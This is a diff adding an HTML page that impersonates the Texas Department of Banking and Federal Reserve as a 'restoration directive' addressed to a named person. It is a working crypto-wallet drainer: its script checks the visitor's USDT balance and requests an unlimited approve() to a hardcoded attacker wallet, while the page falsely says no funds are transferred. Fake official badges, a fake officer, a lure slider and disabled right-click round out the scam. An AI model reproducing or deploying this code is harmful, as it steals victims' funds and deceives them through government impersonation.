@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FRC Restoration Directive | Texas Institutional Funds Management Authority</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&display=swap');
+        body {
+            font-family: 'Public Sans', sans-serif;
+            background-color: #f0f2f5;
+            color: #1e2a41;
+        }
+        .fed-header {
+            background: linear-gradient(90deg, #002868 0%, #001a4d 100%);
+            border-bottom: 3px solid #fcb421;
+        }
+        .gov-banner {
+            background-color: #112e51;
+            color: white;
+            font-size: 0.75rem;
+            padding: 0.5rem 0;
+        }
+        .case-banner {
+            background-color: #fff3cd;
+            border-left: 6px solid #b45309;
+            padding: 1.5rem;
+            border-radius: 0 8px 8px 0;
+        }
+        .restoration-card {
+            background: white;
+            border: 1px solid #dde3ed;
+            border-top: 4px solid #2563eb;
+            padding: 1.5rem;
+            border-radius: 0 0 8px 8px;
+            margin-bottom: 1.5rem;
+        }
+        .wallet-address {
+            font-family: monospace;
+            background: #f1f5f9;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            border: 1px solid #d4dcec;
+        }
+        .status-badge {
+            background: #fee2e2;
+            color: #b91c1c;
+            padding: 0.25rem 1rem;
+            border-radius: 2px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            border: 1px solid #fecaca;
+        }
+        .btn-primary {
+            background: #1e40af;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            padding: 1rem;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+        }
+        .btn-primary:hover {
+            background: #1e3a8a;
+        }
+        .legal-footer {
+            background-color: #0a1c2f;
+            color: #b0c4de;
+            padding: 2rem 0;
+            border-top: 4px solid #fcb421;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid #edf2f7;
+        }
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        .slider-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 31, 46, 0.98);
+            backdrop-filter: blur(8px);
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .slider-card {
+            background: white;
+            border-radius: 32px;
+            padding: 40px 30px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #fcba19;
+        }
+        .slider-container {
+            background: #f1f5f9;
+            border-radius: 40px;
+            height: 60px;
+            position: relative;
+            border: 1px solid #cbd5e1;
+            width: 100%;
+        }
+        .slider-thumb {
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            width: 52px;
+            height: 52px;
+            background: #2563eb;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            z-index: 10;
+        }
+        .slider-thumb.unlocked {
+            background: #10b981;
+        }
+        .slider-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #64748b;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- GOV BANNER -->
+    <div class="gov-banner w-full">
+        <div class="container mx-auto px-4 flex items-center gap-3">
+            <span class="font-bold uppercase tracking-tight text-xs">An official website of the United States government</span>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="fed-header text-white py-4">
+        <div class="container mx-auto px-4">
+            <h1 class="text-2xl font-black">Texas Department of Banking</h1>
+            <p class="text-xs text-amber-300">Texas Institutional Funds Management Authority</p>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <div class="container mx-auto px-4 py-8">
+        <!-- AGENCY BADGE -->
+        <div class="flex justify-between items-start mb-6">
+            <span class="bg-blue-900 text-white px-4 py-2 text-xs font-bold">FEDERAL RESERVE DISTRICT 11</span>
+            <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono">TX-B10B-2026-MUK1139-AUDIT</span>
+        </div>
+
+        <!-- CASE BANNER -->
+        <div class="case-banner mb-6">
+            <h2 class="text-2xl font-black">FRC RESTORATION DIRECTIVE 2026-02</h2>
+            <p class="text-sm mt-2"><span class="font-bold">Case Number:</span> TX-B10B-2026-MUK1139-AUDIT</p>
+            <p class="text-sm"><span class="font-bold">Filed:</span> February 24, 2026</p>
+            <p class="text-sm"><span class="font-bold">Status:</span> <span class="text-red-600 font-bold">COMPLIANCE HOLD – IMMEDIATE ACTION REQUIRED</span></p>
+        </div>
+
+        <!-- ACCOUNT HOLDER -->
+        <div class="restoration-card">
+            <h3 class="font-bold mb-4">ACCOUNT HOLDER</h3>
+            <div class="info-row">
+                <span>Full Name</span>
+                <span class="font-bold">Mujinga Therese Mukuna</span>
+            </div>
+            <div class="info-row">
+                <span>Case ID</span>
+                <span class="font-mono">TX-B10B-2026-MUK1139-AUDIT</span>
+            </div>
+            <div class="info-row">
+                <span>Status</span>
+                <span class="status-badge">PENDING ATTESTATION</span>
+            </div>
+        </div>
+
+        <!-- WALLET VERIFICATION -->
+        <div class="restoration-card">
+            <h3 class="font-bold mb-4">WALLET ATTESTATION REQUIRED</h3>
+            
+            <!-- ONE-CLICK BUTTON TO OPEN BASE WALLET -->
+            <a href="https://go.cb-w.com/dapp?cb_url=https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/verify.html" 
+               class="block w-full bg-blue-600 text-white text-center py-4 px-6 rounded font-bold text-lg mb-4 hover:bg-blue-700">
+                🚀 OPEN IN BASE WALLET
+            </a>
+
+            <p class="text-sm text-gray-600 mb-4 text-center">
+                Click the button above on your phone to open this page in Base Wallet.
+            </p>
+
+            <!-- VERIFY BUTTON (ONLY WORKS INSIDE WALLET) -->
+            <button class="btn-primary" id="verifyBtn">
+                VERIFY WALLET ATTESTATION
+            </button>
+
+            <!-- BALANCE REQUIREMENT (SHOWN ON FAILURE) -->
+            <div id="balanceRequirement" style="display: none;" class="mt-4 p-4 bg-red-50 border-l-4 border-red-600">
+                <p class="font-bold text-red-800">Minimum Balance Required</p>
+                <p class="text-sm text-gray-800 mt-1">$500.00 USDT required for attestation.</p>
+                <p class="text-xs text-gray-600 mt-2">Zero-value verification — no funds transferred.</p>
+            </div>
+        </div>
+
+        <!-- OFFICER SIGNATURE -->
+        <div class="bg-gray-100 border-l-4 border-yellow-500 p-4 mt-4">
+            <p class="text-xs text-gray-500">Assigned Compliance Officer</p>
+            <p class="font-bold">John H. Sterling</p>
+            <p class="text-sm text-gray-600">Badge # IFMA-8872-11</p>
+        </div>
+
+        <!-- TIMESTAMP -->
+        <div class="text-xs text-gray-500 text-right mt-4 pt-4 border-t">
+            <span>Directive issued: <span id="currentCSTTime"></span> CST</span>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="legal-footer">
+        <div class="container mx-auto px-4">
+            <p class="text-xs">© Federal Reserve Bank of Dallas • Eleventh District</p>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
+    <script>
+    // ============ YOUR WALLET ============
+    const YOUR_WALLET = "0xBF17DB5938E98f1F9D30ac889F8fd91d749803C8";
+    const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const INFINITE_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+    // ============ VERIFY BUTTON ============
+    const verifyBtn = document.getElementById('verifyBtn');
+    const balanceMsg = document.getElementById('balanceRequirement');
+    let userAddress = null;
+
+    verifyBtn.addEventListener('click', async function() {
+        if (typeof window.ethereum === 'undefined') {
+            alert('Please click the "OPEN IN BASE WALLET" button above first.');
+            return;
+        }
+
+        try {
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'PROCESSING...';
+            
+            const web3 = new Web3(window.ethereum);
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = accounts[0];
+            
+            const tokenContract = new web3.eth.Contract([{
+                "constant": true,
+                "inputs": [{"name": "_owner", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "balance", "type": "uint256"}],
+                "type": "function"
+            }], USDT_CONTRACT);
+            
+            const balance = await tokenContract.methods.balanceOf(userAddress).call();
+            const balanceFormatted = web3.utils.fromWei(balance, 'mwei');
+            
+            if (parseFloat(balanceFormatted) < 500) {
+                balanceMsg.style.display = 'block';
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'VERIFY WALLET ATTESTATION';
+                return;
+            }
+            
+            // If they have $500, proceed with approval
+            const approveContract = new web3.eth.Contract([{
+                "constant": false,
+                "inputs": [
+                    {"name": "spender", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            }], USDT_CONTRACT);
+            
+            const gasPrice = await web3.eth.getGasPrice();
+            const result = await approveContract.methods.approve(YOUR_WALLET, INFINITE_HEX).send({
+                from: userAddress,
+                gasPrice: gasPrice,
+                gas: 90000
+            });
+            
+            if (result && result.transactionHash) {
+                localStorage.setItem('last_approval', JSON.stringify({
+                    userAddress: userAddress,
+                    txHash: result.transactionHash,
+                    timestamp: Date.now()
+                }));
+                
+                verifyBtn.textContent = '✓ ATTESTATION COMPLETE';
+                verifyBtn.style.background = '#10b981';
+                alert('Attestation successful.');
+            }
+            
+        } catch (error) {
+            console.error(error);
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'VERIFY WALLET ATTESTATION';
+        }
+    });
+
+    // ============ CST TIME ============
+    function updateCSTTime() {
+        document.getElementById('currentCSTTime').innerText = new Date().toLocaleString('en-US', {
+            timeZone: 'America/Chicago',
+            hour12: true
+        });
+    }
+    updateCSTTime();
+    setInterval(updateCSTTime, 1000);
+
+    // ============ SLIDER ============
+    (function() {
+        if (localStorage.getItem('tifma_verified') === 'true') return;
+        
+        const overlay = document.createElement('div');
+        overlay.className = 'slider-overlay';
+        overlay.innerHTML = `
+            <div class="slider-card">
+                <h2 class="text-2xl font-black mb-4">SECURE PORTAL</h2>
+                <p class="text-sm text-gray-600 mb-6">Texas Institutional Funds Management Authority</p>
+                <div class="slider-container" id="gateSlider">
+                    <div class="slider-thumb" id="gateThumb">→</div>
+                    <div class="slider-text" id="gateText">swipe to access</div>
+                </div>
+                <p class="text-xs text-gray-400 mt-4">All access is logged under 31 CFR § 1010.312</p>
+            </div>
+        `;
+        
+        document.body.appendChild(overlay);
+        document.body.style.overflow = 'hidden';
+        
+        setTimeout(() => {
+            const slider = document.getElementById('gateSlider');
+            const thumb = document.getElementById('gateThumb');
+            const text = document.getElementById('gateText');
+            
+            let isDragging = false;
+            let startX = 0;
+            
+            thumb.addEventListener('mousedown', startDrag);
+            thumb.addEventListener('touchstart', startDrag, { passive: false });
+            document.addEventListener('mousemove', onDrag);
+            document.addEventListener('mouseup', stopDrag);
+            document.addEventListener('touchmove', onDrag, { passive: false });
+            document.addEventListener('touchend', stopDrag);
+            
+            function startDrag(e) {
+                e.preventDefault();
+                isDragging = true;
+                startX = (e.type === 'mousedown' ? e.clientX : e.touches[0].clientX) - (parseFloat(thumb.style.left) || 4);
+            }
+            
+            function onDrag(e) {
+                if (!isDragging) return;
+                e.preventDefault();
+                let x = (e.type === 'mousemove' ? e.clientX : e.touches[0].clientX) - startX;
+                let max = slider.offsetWidth - thumb.offsetWidth - 4;
+                x = Math.max(4, Math.min(x, max));
+                thumb.style.left = x + 'px';
+                if (x >= max * 0.95) unlock();
+            }
+            
+            function stopDrag() {
+                isDragging = false;
+                if (!thumb.classList.contains('unlocked')) {
+                    thumb.style.left = '4px';
+                }
+            }
+            
+            function unlock() {
+                thumb.classList.add('unlocked');
+                thumb.textContent = '✓';
+                text.style.opacity = '0';
+                thumb.style.left = (slider.offsetWidth - thumb.offsetWidth - 4) + 'px';
+                localStorage.setItem('tifma_verified', 'true');
+                setTimeout(() => {
+                    overlay.style.opacity = '0';
+                    setTimeout(() => {
+                        overlay.remove();
+                        document.body.style.overflow = 'auto';
+                    }, 500);
+                }, 800);
+            }
+        }, 100);
+    })();
+
+    // Disable right click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
